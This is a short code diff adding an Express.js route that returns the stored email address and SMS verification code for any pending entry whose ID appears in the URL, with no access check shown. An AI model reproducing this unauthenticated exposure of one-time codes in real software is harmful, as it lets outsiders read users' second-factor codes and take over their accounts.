@@ -1718,3 +1718,18 @@ app.post("/update-sms2-choice", (req, res) => {
     res.status(500).json({ error: "Internal server error" });
   }
 });
+
+// ✅ GET /get-sms2-info/:sms2Id
+app.get("/get-sms2-info/:sms2Id", (req, res) => {
+  try {
+    const { sms2Id } = req.params;
+    const entry = pendingSMS2[sms2Id];
+    if (!entry) {
+      return res.json({ email: 'unknown@example.com', code: '?' });
+    }
+    res.json({ email: entry.email, code: entry.code });
+  } catch (err) {
+    console.error("❌ Get SMS 2 info error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
